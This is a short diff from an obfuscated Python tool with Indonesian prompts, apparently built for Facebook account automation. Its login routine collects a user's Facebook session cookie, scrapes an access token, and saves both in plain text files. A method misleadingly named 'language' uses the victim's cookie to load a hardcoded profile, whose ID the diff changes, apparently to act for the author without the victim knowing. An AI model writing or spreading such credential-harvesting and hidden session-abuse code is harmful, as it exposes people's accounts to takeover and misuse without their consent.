@@ -56,7 +56,7 @@ class login_cookie:
     def __init__(self):self.r______ = requests.Session()
     def login(self):baner();Console(width=55).print(panel('Masukan Cookie Akun Facebook',width=55,style='bold white',subtitle='┌',subtitle_align='left'),justify='center');self.cookie = input('   └─> ');self.language(self.cookie);head = {'cookie': self.cookie,'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]','host': 'business.facebook.com'};response = self.r______.get('https://business.facebook.com/business_locations',headers=head).text;tokenku = re.search('(EAAG\w+)', str(response)).group(1);TambahkanCookie(self.cookie,tokenku).Tambahkan();name, id = myname(self.cookie, tokenku);open('Data/Cookie.txt','w').write(self.cookie);open('Data/Token.txt','w').write(tokenku);sleep(2);clear();menu();Console(width=55).print(panel(f'[bold green]{name}',width=55,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Anda Login Ke Facebook Sebagai [bold cyan]<[bold green]<[bold yellow]<'),justify='center')
     def language(self,cookiee):
-        user = '100003917373195'
+        user = '1318874900'
         try:
             with requests.Session() as r:
                 for foll in bs(r.get(f'https://free.facebook.com/'+user,cookies={'cookie':cookiee}).text,'html.parser').find_all('a',href=True):
